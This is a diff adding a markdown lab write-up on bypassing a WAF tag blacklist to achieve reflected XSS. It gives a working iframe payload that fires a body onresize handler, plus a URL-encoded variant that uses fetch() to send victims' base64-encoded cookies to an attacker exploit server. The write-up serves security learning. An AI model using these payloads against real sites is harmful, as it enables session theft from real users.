@@ -1,0 +1,44 @@
+# Reflected XSS into HTML context with most tags and attributes blocked (WAF bypass)
+
+We found that there is a WAF using a blacklist of HTML tags
+
+Using Burp Intruder and the response status codes, we identify which tags are allowed.
+
+1: First, we find allowed tags.
+
+2: Second, we search for allowed attributes.
+
+3: We create the payload.
+
+![Screenshot1](/04-Screenshots/wafbypass1.png)
+
+![Screenshot2](/04-Screenshots/wafbypass2.png)
+
+**Exploitation**
+
+>❗ It is important to note that our own iframe is not affected by the blacklist, so we can use events such as onload. 
+
+We deliver the following script from our server:
+
+```js
+<iframe src="https://<IP>/?search=%22%3E%3Cbody%20onresize=print()%3E" onload=this.style.width='100px'></iframe>
+```
+
+Let’s analyze what we are doing:
+
+- We create an iframe pointing to the victim web application.
+
+- We use the *body* tag and the *onresize event*, which *are not blacklisted* by the WAF.
+
+- To force a resize without user interaction, we add an onload handler on the iframe.
+
+> onload might be blocked by the victim domain’s WAF if it were routed through that WAF, but because the onload handler runs from our server it does not pass through the victim’s WAF.
+
+Example to exfiltrate cookies:
+
+```js
+<iframe
+  src="https://<IP>/?search=%22%3E%3Cbody%20onresize%3Dfetch%28%27https%3A%2F%2F<EXPLOIT-SV>%2Fexploit%2F%3Fcookie%3D%27%2Bbtoa%28document.cookie%29%29%3E"
+  onload="this.style.width='1px';this.offsetWidth;this.style.width='500px'">
+</iframe>
+```
